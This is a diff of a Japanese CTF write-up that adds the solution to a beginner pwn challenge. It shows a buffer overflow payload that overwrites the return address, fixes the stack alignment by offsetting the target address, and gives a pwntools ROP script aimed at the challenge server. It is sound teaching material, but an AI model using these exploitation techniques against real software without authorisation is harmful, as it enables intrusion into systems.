@@ -714,7 +714,7 @@ http://9fe6d1e1f6604ffea6218b36e311548d0.chal3.fwectf.com:8004/fetch?url=http://
 
 https://nanimokangaeteinai.hateblo.jp/entry/2025/08/31/213843
 
-# datamosh
+# 🔺 datamosh
 
 ![](https://storage.googleapis.com/zenn-user-upload/c7c17163a70c-20250902.png)
 
@@ -893,5 +893,167 @@ __attribute__((constructor)) void init() {
 ```
 
 `scanf("%s", buf)` がいかにも怪しくここに不正な入力をすれば強引に flag 関数が実行できそうです。
-しかし、自分はこの flag 関数を呼び出す方法がわからずコンテスト中解けませんでした。
-そのため、きちんと調べて学習したうえで解きます。
+しかし、**自分はこの flag 関数を呼び出す方法がわからずコンテスト中解けませんでした。**
+
+## 解法
+
+https://note.ganyariya.dev/05_CTF/(Full-Weak-Engineer-CTF-2025)-Pwn-Me-Baby-%E3%82%92%E5%AD%A6%E3%81%B3%E3%81%AA%E3%81%8C%E3%82%89%E8%A7%A3%E3%81%8F
+
+スタックフレームに関する Pwn の問題を解くのがはじめてだったため、いろいろなことを調べながら解きました。
+より詳しい解法や右往左往については上記の note.ganyariya.dev を参照ください。
+
+### セキュリティ機構を調べる
+
+pwntools で配布された main ELF ファイルのセキュリティ機構を調べます。
+すると `PIE: No PIE (0x400000)` と表示されます。
+No PIE の場合、 .text 機械語命令が絶対的なアドレス指定がなされ、そのアドレスに命令が配置されないとうまく動かなくなります。
+PIE であればどのアドレスに置かれても正しく動くようになっていますが、それが無効化されています。
+
+よって、 flag / main 関数のアドレスが実行時にランダム化されず、特定のアドレスに配置されることがわかります。
+ゆえに、 scanf でうまく攻撃テキストを入力すれば、 flag 関数を呼び出せそうです。
+
+```bash
+┌──(ganyariya㉿utmkali)-[~/ctf/fullweakctf/pwnmebaby/dist]
+└─$ pwn checksec main
+[*] '/home/ganyariya/ctf/fullweakctf/pwnmebaby/dist/main'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+```
+
+### 攻撃コードを入力する
+
+前知識として関数が利用する `スタックフレーム` への理解ならびにアセンブリコードへの理解が必要になります。
+下記 note などを参考ください。
+
+https://note.ganyariya.dev/01_Note/x86-64-%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E9%96%A2%E6%95%B0%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97%E6%99%82%E3%81%AE%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%81%AE%E6%8C%99%E5%8B%95%E3%82%92%E8%AA%BF%E3%81%B9%E3%82%8B
+
+gdb でレジスタの値やアセンブリコードを覗くと、 main 関数の実行時は以下のようなスタックフレームの構造になっています。
+scanf でデータを入力すると、正しい使い方であれば 0x7fffffffea00 から 0x7fffffffea10 まで 16 文字 (NULL 文字を考慮すれば 15 文字) が配置されます。
+
+```bash
+0x0
++--------------+
+
+------------ 0x7fffffffea00 ← rsp
+~0x18 = 24 Byte~
+main 関数のスタックフレーム
+scanf で入力したデータ 0x7fffffffea00 から連続したアドレスに配置される
+------------ 0x7fffffffea18
+__libc_start_call_main へのリターンアドレス (0x0000000000401dd4)
+------------ 0x7fffffffea20
+__libc_start_call_main のスタックフレーム
+
++--------------+
+0x00000000FFFFFFFFF
+```
+
+ここで `aaaaaaaaaaaaaaaaaaaaaaaa\x10\x18\x40\x0\x0\x0\x0\x0` と入力すれば、 `__libc_start_call_main へのリターンアドレス` を書き換えられます。
+
+- a * 24
+  - パディング
+- `\x10\x18\x40\x0\x0\x0\x0\x0`
+  - Flag 関数のアドレス
+  - 0x401810 のリトルエンディアン
+
+```bash
+0x0
++--------------+
+
+------------ 0x7fffffffea00 ← rsp
+~0x18 = 24 Byte~ → a が 24 個書き込まれる
+main 関数のスタックフレーム
+------------ 0x7fffffffea18
+__libc_start_call_main へのリターンアドレス (0x0000000000401dd4) → 0x401810 (flag 関数) に書き換えられる
+------------ 0x7fffffffea20
+__libc_start_call_main のスタックフレーム
+
++--------------+
+0x00000000FFFFFFFFF
+```
+
+しかし、この攻撃コードを入力すると下記のようにセグフォエラーが発生するのみです。
+なにか意図しないメモリエラーが起きています。
+
+```bash
+root@pve:~/ctf/fullweakctf/pwnmebaby/dist# echo -e "aaaaaaaaaaaaaaaaaaaaaaaa\x10\x18\x40\x0\x0\x0\x0\x0" | ./main
+I will receive a message and do nothing else:Segmentation fault
+```
+
+
+https://zenn.dev/koufu193/articles/b0aa6291d5655c#pwn-me-baby(pwn%2C-beginner)
+
+作問者の方による Writeup では以下のように書かれています。
+これはどういうことなのでしょうか。
+
+> これはアライメントの問題なので RSP が 16 の倍数になるような命令が実行されるように調整する。
+> echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x11\x18\x40\x00\x00\x00\x00\x00"|./main I will receive a message and do nothing else:fwectf{fake_flag}
+
+この問題の解決方法については下記 note を参照ください。
+簡易的にまとめると以下です。
+
+- https://uchan.hateblo.jp/entry/2018/02/16/232029
+  - x86-64 では、メモリと XMM0 レジスタでやりとりする命令を呼び出すとき rsp が 16byte 境界にあることを期待する
+- flag 関数の 1 行目の命令で `push %rbx` がおこなわれ、 rsp が 8byte sub される
+  - このとき、 rsp が 16byte 境界でなくなる
+  - その状態で movaps 命令が実行されてしまいセグフォエラーが発生する
+
+https://note.ganyariya.dev/05_CTF/(Full-Weak-Engineer-CTF-2025)-Pwn-Me-Baby-%E3%82%92%E5%AD%A6%E3%81%B3%E3%81%AA%E3%81%8C%E3%82%89%E8%A7%A3%E3%81%8F#%E3%82%BB%E3%82%B0%E3%83%95%E3%82%A9%E3%82%A8%E3%83%A9%E3%83%BC%E3%82%92%E8%A7%A3%E6%B1%BA%E3%81%97%E3%83%95%E3%83%A9%E3%82%B0%E3%82%92%E7%8D%B2%E5%BE%97%E3%81%99%E3%82%8B
+
+```bash
+Dump of assembler code for function flag:
+=> 0x0000000000401810 <+0>:     push   %rbx
+   0x0000000000401811 <+1>:     pxor   %xmm0,%xmm0
+   0x0000000000401815 <+5>:     xor    %esi,%esi
+   0x0000000000401817 <+7>:     xor    %eax,%eax
+   0x0000000000401819 <+9>:     lea    0x9281a(%rip),%rdi        # 0x49403a
+   0x0000000000401820 <+16>:    add    $0xffffffffffffff80,%rsp
+   0x0000000000401824 <+20>:    movaps %xmm0,(%rsp)
+```
+
+よって、 push %rbx が実行されないように、 scanf で入力するアドレスを 1 つずらせばよいです。
+
+```bash
+root@pve:~/ctf/fullweakctf/pwnmebaby/dist# echo -e "aaaaaaaaaaaaaaaaaaaaaaaa\x11\x18\x40\x0\x0\x0\x0\x0" | ./main
+I will receive a message and do nothing else:fwectf{fake_flag}
+I will receive a message and do nothing else:Segmentation fault (core dumped)
+```
+
+pwntools を使う、かつ ROP 攻撃のパターンも note に記載しているので興味ある方はご参照ください。
+
+```py
+#!/usr/bin/env python3
+from pwn import *
+
+main_path = './main'
+
+if len(sys.argv) == 1:
+        p = remote('chal2.fwectf.com', 8000)
+else:
+        p = process(main_path)
+
+elf = ELF(main_path)
+
+# ret 命令のアドレス
+ret_addr = 0x401016
+flag_addr = elf.symbols['flag']
+
+payload = b'A' * 24
+payload += p64(ret_addr)
+payload += p64(flag_addr)
+
+# I will ... else: の出力を待つ
+data = p.recvuntil(b'else').decode()
+print(data, end='')
+print(payload)
+
+# ./main に payload を TCP で送る
+p.sendline(payload)
+
+data = p.recvline().decode().rstrip()
+print(data)
+```
+
